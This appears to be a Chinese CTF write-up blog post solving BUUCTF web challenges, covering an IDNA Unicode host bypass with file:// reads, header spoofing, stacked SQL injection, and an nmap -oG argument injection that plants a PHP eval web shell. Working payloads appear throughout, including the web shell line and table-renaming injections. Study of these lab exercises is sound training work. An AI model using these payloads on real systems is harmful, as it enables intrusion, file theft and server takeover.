</div><div class="index-category-tag"><div class="level-item"><i class="fas fa-folder-open has-text-grey"> </i><a class="article-more button is-small link-muted" href="/categories/CTF%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/">CTF学习记录</a><span> </span><a class="article-more button is-small link-muted" href="/categories/CTF%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/%E8%B5%9B%E9%A2%98%E5%A4%8D%E7%8E%B0/">赛题复现</a></div>  <div class="level-item"><i class="fas fa-tags has-text-grey"> </i><a class="article-more button is-small link-muted" href="/tags/CTF/">CTF</a><span> </span><a class="article-more button is-small link-muted" href="/tags/web/">web</a><span> </span><a class="article-more button is-small link-muted" href="/tags/SQL%E6%B3%A8%E5%85%A5/">SQL注入</a><span> </span><a class="article-more button is-small link-muted" href="/tags/%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/">报错注入</a><span> </span><a class="article-more button is-small link-muted" href="/tags/Cookie%E6%94%BB%E5%87%BB/">Cookie攻击</a><span> </span><a class="article-more button is-small link-muted" href="/tags/JWT%E4%BC%AA%E9%80%A0/">JWT伪造</a><span> </span><a class="article-more button is-small link-muted" href="/tags/SSTI/">SSTI</a></div></div></article></div><div class="card"><article class="card-content article" role="article"><div class="article-meta size-small is-uppercase level is-mobile"><div class="level-left"><time class="level-item" dateTime="2020-02-10T05:00:01.000Z">2020-02-10</time><span class="level-item">an hour read (About 11815 words)</span></div></div><h1 class="title is-3 is-size-4-mobile"><a class="link-muted" href="/2020/02/10/BUUCTF-web%E5%88%B7%E9%A2%98%E2%85%A1/">BUUCTF-web刷题Ⅱ</a></h1><div class="content"><h2 id="BUUCTF-WEB刷题记录"><a href="#BUUCTF-WEB刷题记录" class="headerlink" title="BUUCTF-WEB刷题记录"></a>BUUCTF-WEB刷题记录</h2><p>继续刷！</p>
<h2 id="SUCTF-2019-Pythonginx"><a href="#SUCTF-2019-Pythonginx" class="headerlink" title="[SUCTF 2019]Pythonginx"></a>[SUCTF 2019]Pythonginx</h2><h3 id="考察知识"><a href="#考察知识" class="headerlink" title="考察知识"></a>考察知识</h3><p>考察Black Hat2019的一个议题：在unicode中字符℀(U+2100)，当利用<code>IDNA</code>处理此字符时，会将℀变成a/c，因此当你访问此url时，dns服务器会自动将url重定向到另一个网站。如果服务器引用前端url时，只对域名做了限制，那么通过这种方法，我们就可以轻松绕过服务器对域名的限制。<br>关于<code>INDA</code>和<code>UIF-8</code>的漏洞：<a href="https://www.cnblogs.com/cimuhuashuimu/p/11490431.html">https://www.cnblogs.com/cimuhuashuimu/p/11490431.html</a><br>此类的字符还有：</p>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">U+<span class="number">2100</span>, ℀</span><br><span class="line">U+<span class="number">2101</span>, ℁</span><br><span class="line">U+<span class="number">2105</span>, ℅</span><br><span class="line">U+<span class="number">2106</span>, ℆</span><br><span class="line">U+FF0F, ／</span><br><span class="line">U+<span class="number">2047</span>, ⁇</span><br><span class="line">U+<span class="number">2048</span>, ⁈</span><br><span class="line">U+<span class="number">2049</span>, ⁉</span><br><span class="line">U+FE16,︖</span><br><span class="line">U+FE56, ﹖</span><br><span class="line">U+FF1F, ？</span><br><span class="line">U+FE5F, ﹟</span><br><span class="line">U+FF03, ＃</span><br><span class="line">U+FE6B, ﹫</span><br><span class="line">U+FF20, ＠</span><br><span class="line">相信总会用到的</span><br></pre></td></tr></table></figure>
<p>参考Black Hat2019的PPT：<br><a href="https://i.blackhat.com/USA-19/Thursday/us-19-Birch-HostSplit-Exploitable-Antipatterns-In-Unicode-Normalization.pdf">https://i.blackhat.com/USA-19/Thursday/us-19-Birch-HostSplit-Exploitable-Antipatterns-In-Unicode-Normalization.pdf</a></p>
<h3 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h3><p>进入题目，给了如下的源码</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, Blueprint, request, Response, escape ,render_template</span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> urlsplit, urlunsplit, unquote</span><br><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> parse</span><br><span class="line"><span class="keyword">import</span> urllib.request</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Index</span></span><br><span class="line"><span class="meta">@app.route('/', methods=['GET'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">app_index</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">'index.html'</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/getUrl', methods=['GET', 'POST'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getUrl</span><span class="params">()</span>:</span></span><br><span class="line">    url = request.args.get(<span class="string">"url"</span>)</span><br><span class="line">    host = parse.urlparse(url).hostname</span><br><span class="line">    <span class="keyword">if</span> host == <span class="string">'suctf.cc'</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"我扌 your problem? 111"</span></span><br><span class="line">    parts = list(urlsplit(url))</span><br><span class="line">    host = parts[<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">if</span> host == <span class="string">'suctf.cc'</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"我扌 your problem? 222 "</span> + host</span><br><span class="line">    newhost = []</span><br><span class="line">    <span class="keyword">for</span> h <span class="keyword">in</span> host.split(<span class="string">'.'</span>):</span><br><span class="line">        newhost.append(h.encode(<span class="string">'idna'</span>).decode(<span class="string">'utf-8'</span>))</span><br><span class="line">    parts[<span class="number">1</span>] = <span class="string">'.'</span>.join(newhost)</span><br><span class="line">    <span class="comment">#去掉 url 中的空格</span></span><br><span class="line">    finalUrl = urlunsplit(parts).split(<span class="string">' '</span>)[<span class="number">0</span>]</span><br><span class="line">    host = parse.urlparse(finalUrl).hostname</span><br><span class="line">    <span class="keyword">if</span> host == <span class="string">'suctf.cc'</span>:</span><br><span class="line">        <span class="keyword">return</span> urllib.request.urlopen(finalUrl).read()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"我扌 your problem? 333"</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    app.run(host=<span class="string">'0.0.0.0'</span>, port=<span class="number">80</span>)</span><br></pre></td></tr></table></figure>
<p>我们看到<code>getUrl()</code>会对传入的<code>url</code>做多层处理和过滤：<br>第一层处理及过滤：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">host = parse.urlparse(url).hostname</span><br><span class="line"><span class="keyword">if</span> host == <span class="string">'suctf.cc'</span>:</span><br><span class="line">    <span class="keyword">return</span> <span class="string">"我扌 your problem? 111"</span></span><br></pre></td></tr></table></figure>
<p>这里<code>host = parse.urlparse(url).hostname</code>返回传入的<code>url</code>的主机名，这里<code>urlparse</code>是将<code>url</code>字符串拆分为组件，可参考：<a href="https://www.cnblogs.com/jiumo/p/11143741.html">https://www.cnblogs.com/jiumo/p/11143741.html</a><br>在本机测试效果如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> urlparse</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>urlparse(<span class="string">'http://www.baidu.com/index.php'</span>)</span><br><span class="line">ParseResult(scheme=<span class="string">'http'</span>, netloc=<span class="string">'www.baidu.com'</span>, path=<span class="string">'/index.php'</span>, params=<span class="string">''</span>, query=<span class="string">''</span>, fragment=<span class="string">''</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>urlparse(<span class="string">'http://www.baidu.com/index.php'</span>).hostname</span><br><span class="line"><span class="string">'www.baidu.com'</span></span><br></pre></td></tr></table></figure>
<p>这里不会对<code>url</code>中的类似于<code>℀</code>的字符做处理，测试效果：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>urlparse(<span class="string">'http://www.baidu.℀om/index.php'</span>).hostname</span><br><span class="line"><span class="string">'www.baidu.℀om'</span></span><br></pre></td></tr></table></figure>
<p>因此借助<code>INDA</code>漏洞构造的<code>url</code>可以通过这一步的过滤。<br>第二层处理及过滤：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">parts = <span class="keyword">list</span>(urlsplit(url))</span><br><span class="line">host = parts[<span class="number">1</span>]</span><br><span class="line"><span class="keyword">if</span> host == <span class="string">'suctf.cc'</span>:</span><br><span class="line">    <span class="keyword">return</span> <span class="string">"我扌 your problem? 222 "</span> + host</span><br></pre></td></tr></table></figure>
<p><code>urlsplit</code>是将<code>url</code>进行分割，测试：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> urlsplit</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>urlsplit(<span class="string">'http://www.baidu.com/index.php'</span>)</span><br><span class="line">SplitResult(scheme=<span class="string">'http'</span>, netloc=<span class="string">'www.baidu.com'</span>, path=<span class="string">'/index.php'</span>, query=<span class="string">''</span>, fragment=<span class="string">''</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>urlsplit(<span class="string">'http://www.baidu.com/index.php'</span>)[<span class="number">1</span>]</span><br><span class="line"><span class="string">'www.baidu.com'</span></span><br></pre></td></tr></table></figure>
<p>此处利用了一个<a href="https://link.zhihu.com/?target=https%3A//bugs.python.org/issue36216">CVE</a>：<strong>urlsplit不处理 NFKC 标准化</strong>(用 Punycode/IDNA编码的URL使用NFKC规范化来分解字符)，因此对<code>℀</code>类的字符也是处理不了的：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>urlsplit(<span class="string">'http://www.baidu.℀om/index.php'</span>)[<span class="number">1</span>]</span><br><span class="line"><span class="string">'www.baidu.℀om'</span></span><br></pre></td></tr></table></figure>
<p>绕过前两层过滤，到第三层处理：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">newhost = []</span><br><span class="line"><span class="keyword">for</span> h in host.split(<span class="string">'.'</span>):</span><br><span class="line">    newhost.append(h.encode(<span class="string">'idna'</span>).decode(<span class="string">'utf-8'</span>))</span><br><span class="line">parts[<span class="number">1</span>] = <span class="string">'.'</span>.join(newhost)</span><br></pre></td></tr></table></figure>
<p>我们发现，这里是在<code>url</code>的<code>.</code>处进行分割，并加入到<code>newhost[]</code>数组中，但是加入数组之前会继续<code>INDA</code>编码然后<code>UTF-8</code>解码，那么在此处<code>℀</code>类的字符便会被解析为<code>a/c</code>，我们利用此漏洞便可以构造能打入服务器拿flag的payload了。</p>
<h3 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h3><p>我们从前面的代码看到，构造的<code>url</code>的域名需要绕过前两层<code>host == &#39;suctf.cc&#39;</code>的判断，并且要满足第三层的<code>host == &#39;suctf.cc&#39;</code>，那么我们便可以构造域名：<code>suctf.c℆sr</code>便可以绕过对域名的判断。<br>但是现在我们不知道flag文件在哪，但是题目给了提示：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;!-- Dont worry about the suctf.cc. Go on! --&gt;</span><br><span class="line">&lt;!-- <span class="keyword">Do</span> you know the nginx? --&gt;</span><br></pre></td></tr></table></figure>
<p>提示我们是基于<code>nginx</code>架构的服务器，那肯定与其配置文件相关<br>这里补充知识：</p>
<figure class="highlight dts"><table><tr><td class="code"><pre><span class="line">Nginx重要文件位置:</span><br><span class="line">配置文件存放目录：<span class="meta-keyword">/etc/</span>nginx</span><br><span class="line">主配置文件：<span class="meta-keyword">/etc/</span>nginx<span class="meta-keyword">/conf/</span>nginx.conf</span><br><span class="line">管理脚本：<span class="meta-keyword">/usr/</span>lib64<span class="meta-keyword">/systemd/</span>system/nginx.service</span><br><span class="line">模块：<span class="meta-keyword">/usr/</span>lisb64<span class="meta-keyword">/nginx/</span>modules</span><br><span class="line">应用程序：<span class="meta-keyword">/usr/</span>sbin/nginx</span><br><span class="line">程序默认存放位置：<span class="meta-keyword">/usr/</span>share<span class="meta-keyword">/nginx/</span>html</span><br><span class="line">日志默认存放位置：<span class="meta-keyword">/var/</span>log/nginx</span><br><span class="line">配置文件目录为：<span class="meta-keyword">/usr/</span>local<span class="meta-keyword">/nginx/</span>conf/nginx.conf</span><br></pre></td></tr></table></figure>
<p>我们读取<code>nignx.conf</code>应该能找到flag文件的位置，构造payload：</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">file:<span class="regexp">//</span>suctf.c℆sr<span class="regexp">/local/</span>nginx<span class="regexp">/conf/</span>nginx.conf</span><br></pre></td></tr></table></figure>
<p>利用<code>file</code>协议读取<code>nginx.conf</code>内容如下：</p>
<figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="section">server</span> &#123; <span class="attribute">listen</span> <span class="number">80</span>; <span class="attribute">location</span> / &#123; <span class="attribute">try_files</span> <span class="variable">$uri</span> <span class="variable">@app</span>; &#125; <span class="attribute">location</span> <span class="variable">@app</span> &#123; <span class="attribute">include</span> uwsgi_params; <span class="attribute">uwsgi_pass</span> unix:///tmp/uwsgi.sock; &#125; <span class="attribute">location</span> /static &#123; <span class="attribute">alias</span> /app/static; &#125; <span class="comment"># location /flag &#123; # alias /usr/fffffflag; # &#125; &#125;</span></span><br></pre></td></tr></table></figure>
<p>拿到flag文件的位置之后，构造最终payload：</p>
<figure class="highlight llvm"><table><tr><td class="code"><pre><span class="line">/getUrl?url=file://suctf.<span class="keyword">c</span><span class="symbol">%E2</span><span class="symbol">%84</span><span class="symbol">%86</span>sr/fffffflag</span><br></pre></td></tr></table></figure>
<p>这里注意<code>℆</code>需要进行url编码。</p>
<p>拓展一下：python的<code>urlsplit</code>函数其实是比较不完善的，还存在<a href="https://link.zhihu.com/?target=https%3A//bugs.python.org/issue36742">urlsplit NFKD 标准化漏洞</a>，以后遇到的时候需要多加注意。</p>
<h2 id="极客大挑战-2019-Http"><a href="#极客大挑战-2019-Http" class="headerlink" title="[极客大挑战 2019]Http"></a>[极客大挑战 2019]Http</h2><p>考察<code>http</code>协议的题目，常见也简单。</p>
<h3 id="解题-1"><a href="#解题-1" class="headerlink" title="解题"></a>解题</h3><p>查看源码发现一个<code>Secret.php</code>的链接，进去之后提示：<br><img src="http://www.ggb0n.cool/images/BUUCTF-web28.png" alt=""><br>伪造<code>Refer</code>头即可，伪造之后又提示：<br><img src="http://www.ggb0n.cool/images/BUUCTF-web29.png" alt=""><br>伪造<code>UA</code>头即可，然后提示需要来自本地：<br><img src="http://www.ggb0n.cool/images/BUUCTF-web30.png" alt=""><br>伪造<code>IP</code>即可拿到flag<br><img src="http://www.ggb0n.cool/images/BUUCTF-web31.png" alt=""><br>这个地方可以伪造多处，可以伪造<code>x-forwarded-for</code>也可以伪造<code>client-ip</code>，还可以伪造<code>host</code>头，有些时候甚至把三个都伪造上，之前打比赛遇到一个题目就是，巨坑…</p>
<p>伪造协议头可以通过BP抓包改包，当然有更方便的方法，这里推荐一个火狐/谷歌的插件<code>Header Editor</code>方便好用。</p>
<h2 id="强网杯-2019-随便注"><a href="#强网杯-2019-随便注" class="headerlink" title="[强网杯 2019]随便注"></a>[强网杯 2019]随便注</h2><p>考察堆叠注入<br>注入原理：<br>在SQL中，分号（;）是用来表示一条sql语句的结束。试想一下我们在 ; 结束一个sql语句后继续构造下一条语句，会不会一起执行？答案是会的，这也就造就了堆叠注入。而union injection（联合注入）也是将两条语句合并在一起，两者之间区别就在于union 或者union all执行的语句类型是有限的，可以用来执行查询语句，而堆叠注入可以执行的是任意的语句。例如：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">用户输入：1; <span class="keyword">DELETE</span> <span class="keyword">FROM</span> products服务器端生成的<span class="keyword">sql</span>语句为：（因未对输入的参数进行过滤）<span class="keyword">Select</span> * <span class="keyword">from</span> products <span class="keyword">where</span> productid=<span class="number">1</span>;<span class="keyword">DELETE</span> <span class="keyword">FROM</span> products当执行查询后，第一条显示查询信息，第二条则将整个表进行删除。</span><br></pre></td></tr></table></figure>
<h3 id="题目分析-1"><a href="#题目分析-1" class="headerlink" title="题目分析"></a>题目分析</h3><p>进入题目可以看到一个提示框，进行注入测试，<code>1&#39;</code>的时候不回显，<code>1&#39;#</code>则回显，说明存在sql注入，<code>order by</code>语句得知有两个字段，但是用<code>union select</code>组合查询的时候提示了过滤的情况：<br><img src="" alt=""><br>可以看到，常用的注入语句基本全被过滤了，网上参考得知是<code>堆叠注入</code>。</p>
<h3 id="解题-2"><a href="#解题-2" class="headerlink" title="解题"></a>解题</h3><p>利用堆叠注入进行注入：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">爆库：1';<span class="keyword">show</span> <span class="keyword">databases</span>;<span class="comment">#</span></span><br><span class="line">爆表：1';<span class="keyword">show</span> <span class="keyword">tables</span><span class="comment">#</span></span><br></pre></td></tr></table></figure>
<p>查表回显的结果如下：<br><img src="http://www.ggb0n.cool/images/BUUCTF-web33.png" alt="">。<br>我们看到有一个<code>words</code>表和一个<code>1919810931114514</code>表，flag应该在<code>1919810931114514</code>中没错了，看一下：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">1';<span class="keyword">show</span> <span class="keyword">columns</span> <span class="keyword">from</span> <span class="string">`1919810931114514`</span> //注意以纯数字作为表名，查表的时候需要用反引号</span><br></pre></td></tr></table></figure>
<p><img src="http://www.ggb0n.cool/images/BUUCTF-web34.png" alt=""><br>现在，我们知道flag在<code>1919810931114514</code>表了，但是用去查询的字段都被过滤了，所以需要用其他的方法来获取flag。<br>我们可以看到，在输入<code>1</code>或者<code>2</code>的时候，都会返回一个字符串，因此猜测内部查询语句应该是默认匹配<code>words</code>库的，查询语句也就类似于<code>select id, data from words where id =</code>，因此我们可以把<code>1919810931114514</code>表改名为<code>words</code>表，并且加入<code>id</code>列，同时将<code>flag</code>列改为<code>data</code>列，如此一来，我们查询<code>1&#39; or 1=1#</code>就能拿到flag了。<br>最终构造payload：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">1’;<span class="keyword">rename</span> <span class="keyword">table</span> words <span class="keyword">to</span> word1;<span class="keyword">rename</span> <span class="keyword">table</span> <span class="number">1919810931114514</span> <span class="keyword">to</span> words;<span class="keyword">alter</span> <span class="keyword">table</span> words <span class="keyword">add</span> <span class="keyword">id</span> <span class="built_in">int</span> <span class="keyword">unsigned</span> <span class="keyword">not</span> <span class="literal">Null</span> auto_increment primary <span class="keyword">key</span>; alert table words <span class="keyword">change</span> flag <span class="keyword">data</span> <span class="built_in">varchar</span>(<span class="number">100</span>);<span class="comment">#</span></span><br></pre></td></tr></table></figure>
<p>然后<code>1&#39; or 1=1</code>即可拿到flag。</p>
<h2 id="SUCTF-2019-EasySQL"><a href="#SUCTF-2019-EasySQL" class="headerlink" title="[SUCTF 2019]EasySQL"></a>[SUCTF 2019]EasySQL</h2><p>也是考察堆叠注入，但是与上题不同，本题突破点在于：<strong>mysql中通过set sql_mode=PIPES_AS_CONCAT可以将||视为字符串的连接操作符而非或运算符</strong>，利用语句堆叠设置这个环境变量，然后再通过<code>||</code>拼接查询flag即可。</p>
<h3 id="题目分析-2"><a href="#题目分析-2" class="headerlink" title="题目分析"></a>题目分析</h3><p>进入题目，和上题一样是一个查询框，可以拿到源码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    session_start();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">include_once</span> <span class="string">"config.php"</span>;</span><br><span class="line"></span><br><span class="line">    $post = <span class="keyword">array</span>();</span><br><span class="line">    $get = <span class="keyword">array</span>();</span><br><span class="line">    <span class="keyword">global</span> $MysqlLink;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//GetPara();</span></span><br><span class="line">    $MysqlLink = mysqli_connect(<span class="string">"localhost"</span>,$datauser,$datapass);</span><br><span class="line">    <span class="keyword">if</span>(!$MysqlLink)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"Mysql Connect Error!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    $selectDB = mysqli_select_db($MysqlLink,$dataName);</span><br><span class="line">    <span class="keyword">if</span>(!$selectDB)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"Choose Database Error!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">foreach</span> ($_POST <span class="keyword">as</span> $k=&gt;$v)&#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="keyword">empty</span>($v)&amp;&amp;is_string($v))&#123;</span><br><span class="line">            $post[$k] = trim(addslashes($v));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">foreach</span> ($_GET <span class="keyword">as</span> $k=&gt;$v)&#123;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//die();</span></span><br><span class="line">    <span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line"></span><br><span class="line">&lt;body&gt;</span><br><span class="line"></span><br><span class="line">&lt;a&gt; Give me your flag, I will tell you <span class="keyword">if</span> the flag is right. &lt;/ a&gt;</span><br><span class="line">&lt;form action=<span class="string">""</span> method=<span class="string">"post"</span>&gt;</span><br><span class="line">&lt;input type=<span class="string">"text"</span> name=<span class="string">"query"</span>&gt;</span><br><span class="line">&lt;input type=<span class="string">"submit"</span>&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>($post[<span class="string">'query'</span>]))&#123;</span><br><span class="line">        $BlackList = <span class="string">"prepare|flag|unhex|xml|drop|create|insert|like|regexp|outfile|readfile|where|from|union|update|delete|if|sleep|extractvalue|updatexml|or|and|&amp;|\""</span>;</span><br><span class="line">        <span class="comment">//var_dump(preg_match("/&#123;$BlackList&#125;/is",$post['query']));</span></span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">"/&#123;$BlackList&#125;/is"</span>,$post[<span class="string">'query'</span>]))&#123;</span><br><span class="line">            <span class="comment">//echo $post['query'];</span></span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"Nonono."</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(strlen($post[<span class="string">'query'</span>])&gt;<span class="number">40</span>)&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"Too long."</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        $sql = <span class="string">"select "</span>.$post[<span class="string">'query'</span>].<span class="string">"||flag from Flag"</span>;</span><br><span class="line">        mysqli_multi_query($MysqlLink,$sql);</span><br><span class="line">        <span class="keyword">do</span>&#123;</span><br><span class="line">            <span class="keyword">if</span>($res = mysqli_store_result($MysqlLink))&#123;</span><br><span class="line">                <span class="keyword">while</span>($row = mysqli_fetch_row($res))&#123;</span><br><span class="line">                    print_r($row);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">while</span>(@mysqli_next_result($MysqlLink));</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>看到    <code>mysql_multi_query()</code>得知可以堆叠注入，这里关注查询语句<code>$sql = &quot;select &quot;.$post[&#39;query&#39;].&quot;||flag from Flag&quot;;</code>可以看到，查询语句是将我们传入的语句与<code>||flag from Flag</code>拼接在一起了，这里补充知识：</p>
<ul>
<li>在oracle 缺省支持 通过 ‘ || ’ 来实现字符串拼接，但在mysql 缺省不支持。需要调整mysql 的sql_mode模式：pipes_as_concat 来实现oracle 的一些功能。</li>
</ul>
<p>因此我们通过堆叠注入设置<code>sql_mode</code>，然后再查询即可。</p>
<h3 id="解题-3"><a href="#解题-3" class="headerlink" title="解题"></a>解题</h3><p>构造最终payload：<code>1;set sql_mode=PIPES_AS_CONCAT;select 1</code></p>
<p>非预期解：直接构造payload为<code>*,1</code>即可拿到flag</p>
<ul>
<li>字符串<code>或</code>时前面的数字时结果为<code>1</code>则返回<code>1</code>，为<code>0</code>则返回<code>0</code>，效果跟直接*一样。</li>
</ul>
<h2 id="BUUCTF-2018-Online-Tool"><a href="#BUUCTF-2018-Online-Tool" class="headerlink" title="[BUUCTF 2018]Online Tool"></a>[BUUCTF 2018]Online Tool</h2><p>考察<code>namp</code>的一个命令<code>-oG</code>，以及<code>escapeshellarg()</code>和<code>escapeshellarg()</code>函数合起来使用造成的漏洞。</p>
<h3 id="题目分析-3"><a href="#题目分析-3" class="headerlink" title="题目分析"></a>题目分析</h3><p>首先看到代码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_SERVER[<span class="string">'HTTP_X_FORWARDED_FOR'</span>])) &#123;</span><br><span class="line">    $_SERVER[<span class="string">'REMOTE_ADDR'</span>] = $_SERVER[<span class="string">'HTTP_X_FORWARDED_FOR'</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_GET[<span class="string">'host'</span>])) &#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    $host = $_GET[<span class="string">'host'</span>];</span><br><span class="line">    $host = escapeshellarg($host);</span><br><span class="line">    $host = escapeshellcmd($host);</span><br><span class="line">    $sandbox = md5(<span class="string">"glzjin"</span>. $_SERVER[<span class="string">'REMOTE_ADDR'</span>]);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'you are in sandbox '</span>.$sandbox;</span><br><span class="line">    @mkdir($sandbox);</span><br><span class="line">    chdir($sandbox);</span><br><span class="line">    <span class="keyword">echo</span> system(<span class="string">"nmap -T5 -sT -Pn --host-timeout 2 -F "</span>.$host);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>我们看到，代码主要是通过利用<code>nmap</code>的命令拼接上我们的输入来执行，参考别人的题解得知<code>namp</code>的一个参数<code>-oG</code>可以向目标机器中写入文件，通过这个参数，我们便可以向目标机器写入一个小马来连接。<br>但是我们只能从<code>host</code>参数来写入内容，那么我们写入的小马代码便会被<code>escapeshellarg()</code>和<code>escapeshellarg()</code>做处理，即将<code>host</code>中包含的字符转义，便可以影响小马的上传，因此需要利用它们结合使用存在的漏洞来绕过。<br>这里可以参考：<a href="https://paper.seebug.org/164/">https://paper.seebug.org/164/</a><br>即传入的参数内容中包含<code>&#39;</code>则会造成漏洞，例如：</p>
<ul>
<li>传入的参数是：<code>172.17.0.2&#39; -v -d a=1</code></li>
<li>经过<code>escapeshellarg</code>处理后变成了<code>&#39;172.17.0.2&#39;\&#39;&#39; -v -d a=1&#39;</code>，即先对单引号转义，再用单引号将左右两部分括起来从而起到连接的作用。</li>
<li>经过<code>escapeshellcmd</code>处理后变成<code>&#39;172.17.0.2&#39;\\&#39;&#39; -v -d a=1\&#39;</code>，这是因为<code>escapeshellcmd</code>对<code>\</code>以及最后那个不配对儿的<code>&#39;</code>进行了转义</li>
<li>最后执行的命令是<code>curl &#39;172.17.0.2&#39;\\&#39;&#39; -v -d a=1\&#39;</code>，由于中间的<code>\\</code>被解释为<code>\</code>而不再是转义字符，所以后面的<code>&#39;</code>没有被转义，与再后面的<code>&#39;</code>配对儿成了一个空白连接符。所以可以简化为<code>curl 172.17.0.2\ -v -d a=1&#39;</code>，即向<code>172.17.0.2\</code>发起请求，<code>POST</code>数据为<code>a=1&#39;</code>。</li>
</ul>
<p>这里我们是利用<code>namp</code>执行命令，那么需要了解一些<code>namp</code>的基本知识：<code>namp -PS 127.0.0.1</code>与<code>namp -PS &#39;&#39; 127.0.0.1</code>与<code>nmap -PS &#39;&quot; &quot;&#39; 127.0.0.1 &quot; &quot;</code>效果是一样的。</p>
<h3 id="解题-4"><a href="#解题-4" class="headerlink" title="解题"></a>解题</h3><p>构造payload：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?host=<span class="string">' &lt;?php @eval($_POST["hack"]);?&gt; -oG hack.php '</span></span><br></pre></td></tr></table></figure>
<p>写入之后返回了小马存储的路径：<br><img src="http://www.ggb0n.cool/images/BUUCTF-web35.png" alt=""><br>然后去蚁剑连接即可。</p>
<h2 id="ZJCTF-2019-NiZhuanSiWei"><a href="#ZJCTF-2019-NiZhuanSiWei" class="headerlink" title="[ZJCTF 2019]NiZhuanSiWei"></a>[ZJCTF 2019]NiZhuanSiWei</h2><p>考察<code>file_get_contents</code>的绕过，以及反序列化。<br>补充知识：<code>file_get_contents</code>的绕过</p>
<blockquote>
